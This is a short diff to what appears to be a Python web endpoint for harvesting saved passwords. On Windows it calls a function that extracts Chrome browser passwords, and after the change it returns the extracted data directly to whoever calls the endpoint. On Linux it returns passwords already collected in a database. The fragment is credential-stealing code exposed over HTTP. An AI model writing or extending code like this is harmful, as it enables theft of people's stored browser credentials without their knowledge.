@@ -379,8 +379,7 @@ def user_password():
         system = platform.system()
         
         if system == 'Windows':
-            extract_windows_chrome_passwords()
-            return jsonify({"message": "User passwords update successfully"})
+            return extract_windows_chrome_passwords()
         elif system == 'Linux':
             # On Linux, just return any passwords already in the database
             try:
